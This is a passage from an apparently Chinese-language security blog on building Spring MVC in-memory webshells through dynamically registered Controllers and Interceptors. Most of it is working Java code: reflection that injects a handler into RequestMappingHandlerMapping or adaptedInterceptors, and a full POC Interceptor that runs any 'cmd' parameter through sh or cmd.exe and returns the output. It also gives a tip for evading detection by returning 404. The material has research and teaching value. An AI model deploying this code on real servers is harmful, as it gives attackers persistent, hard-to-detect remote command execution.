class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InjectedController</span> <span class="variable">injectedController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectedController</span>();</span><br><span class="line"></span><br><span class="line">        requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先访问Inject进行controller注册。然后访问controller映射路径evilcontroller，带上参数就能RCE</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134710299.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134710299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116134710299"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134914576.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134914576.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116134914576"></p><p>除此以外，还有两种方式能模拟注册Controller</p><p>②detectHandlerMethods直接注册</p><p>上面指出：在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230115144613123"></p><p>该方法接收handler参数，就能寻找到bean并注册controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.<span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="comment">// 3. 反射获得 detectHandlerMethods Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="string">&quot;detectHandlerMethods&quot;</span>, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//4.将 dynamicController 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure><p>③利用registerHandler</p><p>上面的方法适用于spring3.1后RequestMappingHandlerMapping为映射器。当用DefaultAnnotationHandlerMapping为映射器时。该类顶层父类的registerHandler接收urlPath参数和handler参数来注册controller。不过不常用了，贴一下利用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.<span class="type">DefaultAnnotationHandlerMapping</span>  <span class="variable">dh</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br><span class="line"><span class="comment">// 3. 反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="string">&quot;registerHandler&quot;</span>, String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">&quot;/favicon&quot;</span>, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure><p>还可以加个else不带参数时返回404状态码，减少被检测到的概率</p><h2 id="Interceptor拦截器内存马构造"><a href="#Interceptor拦截器内存马构造" class="headerlink" title="Interceptor拦截器内存马构造"></a>Interceptor拦截器内存马构造</h2><p>Interceptor和Tomcat和Filter过滤器很类似。区别如下：</p><ol><li>Interceptor基于反射，Filter基于函数回调</li><li>Interceptor不依赖servlet容器</li><li>Interceptor只能对action请求有用</li><li>Interceptor可以访问action上下文，栈里的对象。Filter不能</li><li>action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次</li><li>Interceptor可以获取IOC容器中的bean，Filter不行</li></ol><p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p><h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><p>DispatcherServlet.doDispatch中，进行了getHandler，持续跟进发现最终调用的是AbstractHandlerMapping#getHandler()，该方法中调用了getHandlerExecutionChain()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151435756.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151435756.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116151435756"></p><p>该方法从adaptedInterceptors中把符合的拦截器添加到chain里。adaptedInterceptors就存放了全部拦截器</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151607398.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151607398.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116151607398"></p><p>返回到DispatcherServlet#doDispatch()，getHandler后执行了applyPreHandle遍历执行了拦截器。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152125751.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152125751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116152125751"></p><p>而且可以看到applyPreHandle后面就是ha.handle()，执行controller，所以说Interceptors是在controller之前执行的</p><p>师傅给出了Filter,controller,Interceptors执行的顺序：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152540872.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152540872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116152540872"></p><ul><li>preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li><li>postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li><li>afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li></ul><h3 id="1-获取RequestMappingHandlerMapping"><a href="#1-获取RequestMappingHandlerMapping" class="headerlink" title="1. 获取RequestMappingHandlerMapping"></a>1. 获取RequestMappingHandlerMapping</h3><p>因为是在AbstractHandlerMapping类中，用addInterceptor向拦截器chain中添加的。该类是抽象类，可以获取其实现类RequestMappingHandlerMapping。一样的，前面提了四种方法。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152954118.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152954118.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116152954118"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-反射获取adaptedInterceptors"><a href="#2-反射获取adaptedInterceptors" class="headerlink" title="2.反射获取adaptedInterceptors"></a>2.反射获取adaptedInterceptors</h3><p>获取adaptedInterceptors，private属性，使用反射。并且传入RequestMappingHandlerMapping初始化</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116153445849.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116153445849.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116153445849"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    field = RequestMappingHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-添加恶意Interceptors"><a href="#3-添加恶意Interceptors" class="headerlink" title="3.添加恶意Interceptors"></a>3.添加恶意Interceptors</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adaptInterceptors.add(<span class="keyword">new</span> <span class="title class_">InjectEvilInterceptor</span>(<span class="string">&quot;a&quot;</span>));</span><br></pre></td></tr></table></figure><p>恶意Interceptor:需要实现HandlerInterceptor接口，通过重写preHandle进行RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试：-1"><a href="#测试：-1" class="headerlink" title="测试："></a>测试：</h3><p>过滤器和controller可以直接使用@RequestMapping注解进行URL映射。拦截器Interceptor需要手动编写一个Config添加进去，或者直接修改配置文件spingmvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.example.InjectInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">InjectInterceptor</span> <span class="variable">evilInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectInterceptor</span>();</span><br><span class="line">        adaptInterceptors.add(evilInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新建一个controller触发拦截器，作为入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span 